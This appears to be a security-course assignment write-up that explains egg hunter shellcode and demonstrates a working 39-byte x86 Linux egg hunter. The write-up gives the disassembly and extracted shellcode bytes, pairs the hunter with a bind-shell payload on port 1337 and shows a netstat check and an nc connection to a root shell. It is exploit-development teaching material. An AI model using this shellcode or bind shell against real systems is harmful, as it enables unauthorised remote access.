In Assignment #3	we need to perform following task:

a.Study about the Egg Hunter shellcode
b.Create a working demo of the Egghunter
c.Should be configurable for different payloads	

a. Study about the Egg Hunter shellcode
 
Egg Hunting: Egg hunting is a technique used to search Virtual Address Space (VAS) for pattern referred to by Egg that usually marks 
the start of our desired payload. If we hit an unallocated memory while searching for that pattern we may experience that ,the process 
will SIGSEGV leading to a crash.To prevent this kind of behavior we may abuse the system syscall [Skape recommended is abusing the access()
syscall.]to hunt for our egg without crashing.
 
The "egg-hunter" is a form of staged shellcode that is useful when we can inject a large payload into a process but aren't sure where in 
memory it will end up. If we can get the instruction pointer to point to a smaller, hunter code, we can search memory to find the main 
payload, which is prepended with a small tag of bytes (the egg).

There is a great resource for egg hunter theory/implementation at http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf.

There are 3 conditions that are important in order for this technique to work:

1. We must be able to jump to (jmp, call, push/ret) & execute “some” shellcode.  The amount of available buffer space can be relatively 
small,because it will only contain the so-called “egg hunter”.  The egg hunter code must be available in a predictable location (so we can 
reliably jump to it & execute it).
2. The final shellcode must be available somewhere in memory (stack/heap/…).
3. We must “tag” or prepend the final shellcode with a unique string/marker/tag. The initial shellcode (the small “egg hunter”) will step 
through memory, looking for this marker.When it finds it, it will start executing the code that is placed right after the marker using a 
jmp or call instruction.This means that we will have to define the marker in the egg hunter code, and also write it just in front of the 
actual shellcode.


b.Create a working demo of the Egghunter
Prepare a Egghunter NASM file based on  http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf [access(2) revisited]

root@kali:/home/SLAE/MY_EXP/Assignment3# nasm -f elf EggHunter_assignment3.nasm
root@kali:/home/SLAE/MY_EXP/Assignment3# ld -o EggHunter_assignment3 EggHunter_assignment3.o
root@kali:/home/SLAE/MY_EXP/Assignment3# objdump -D EggHunter_assignment3 -M intel

EggHunter_assignment3:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 db                   xor    ebx,ebx
 8048062:       31 c9                   xor    ecx,ecx
 8048064:       f7 e1                   mul    ecx

08048066 <memory_block>:
 8048066:       66 81 ca ff 0f          or     dx,0xfff

0804806b <search>:
 804806b:       42                      inc    edx
 804806c:       8d 5a 04                lea    ebx,[edx+0x4]
 804806f:       6a 21                   push   0x21
 8048071:       58                      pop    eax
 8048072:       cd 80                   int    0x80
 8048074:       3c f2                   cmp    al,0xf2
 8048076:       74 ee                   je     8048066 <memory_block>
 8048078:       b8 74 30 30 6c          mov    eax,0x6c303074
 804807d:       89 d7                   mov    edi,edx
 804807f:       af                      scas   eax,DWORD PTR es:[edi]
 8048080:       75 e9                   jne    804806b <search>
 8048082:       af                      scas   eax,DWORD PTR es:[edi]
 8048083:       75 e6                   jne    804806b <search>
 8048085:       ff e7                   jmp    edi
root@kali:/home/SLAE/MY_EXP/Assignment3#

Obtain the Egghunter Shellcodes for this EggHunter_assignment3

root@kali:/home/SLAE/MY_EXP/Assignment3# objdump -d ./EggHunter_assignment3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xdb\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x74\x30\x30\x6c\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"

For this case, my Egghunter shellcode is Length 39 bytes, because i issue few addition x86 instruction for clear of eax,ebx,ecx & edx 
for more realibility. 

c.Should be configurable for different payloads	

For quick demo of our egghunter shellcode working with different payload, we collect shellcode from http://shell-storm.org.
http://shell-storm.org/shellcode/files/shellcode-882.php
This shellcode is length is 89 bytes & will perfrom bind TCP Shellcode Port 1337 on Linux x86 platform.

Compile the shellcode & execute it on the x86 Linux system 

root@kali:/home/SLAE/MY_EXP/Assignment3# gcc -fno-stack-protector -z execstack shellcode.c -o Egg_hunter_working_demo
root@kali:/home/SLAE/MY_EXP/Assignment3# ./Egg_hunter_working_demo 
Egg Hunter Shellcode Length:  39
Final payload Shellcode Length:  97

From another terminal we 1st check netstat -antp command for ensure is the TCP Port 1337 open or Not

root@kali:/home/SLAE/MY_EXP/Assignment3# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1786/sshd           
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      2227/./Egg_hunter_w 
tcp        0      0 192.168.154.131:22      192.168.154.1:1503      TIME_WAIT   -                   
tcp        0      0 192.168.154.131:22      192.168.154.1:1902      ESTABLISHED 2214/sshd: root@not 
tcp6       0      0 :::22                   :::*                    LISTEN      1786/sshd         

Yes, the TCP port 1337 is open.
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      2227/./Egg_hunter_w 

From the terminal if we try to connect this TCP port using "nc" we will get shell, for example :

root@kali:/home/SLAE/MY_EXP/Assignment3# nc localhost 1337
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux kali 4.4.0-kali1-686 #1 SMP Debian 4.4.2-3kali1 (2016-02-23) i686 GNU/Linux



